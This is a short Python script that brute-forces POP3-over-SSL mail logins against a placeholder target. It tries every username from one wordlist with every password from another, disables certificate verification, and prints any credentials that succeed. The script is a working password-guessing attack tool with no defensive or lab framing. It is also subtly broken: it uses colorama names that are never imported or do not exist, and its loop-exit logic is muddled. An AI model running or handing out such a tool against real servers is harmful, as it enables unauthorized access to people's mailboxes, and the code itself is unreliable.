import poplib
import ssl
import colorama

def file2list(filename):
    with open(filename, 'r') as file:
        return [line.strip() for line in file]

def try_login(server, port, user, password, pem_file):
    try:
        context = ssl.create_default_context(cafile=pem_file)
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        pop_conn = poplib.POP3_SSL(server, port, context=context)
        pop_conn.user(user)
        response = pop_conn.pass_(password)
        if b'+OK' in response:
            return True
    except poplib.error_proto:
        pass
    return False

server = 'TARGET_IP_HERE'
port = 995
pem_file = 'ca.pem'  # Path to your PEM file
userlist = file2list('users.txt')  # Path to your users file
passlist = file2list('pass.txt')  # Path to your password file

print("[*] Searching for valid POP3 logins...")

for user in userlist:
    for password in passlist:
        print(f"[*] Trying {user}:{password}")
        if try_login(server, port, user, password, pem_file):
            print(f"{Fore.LIGHTGREEN_EX}[+] Found Login: {user}:{password}{Style.RESET}")
    else:
        continue
    break
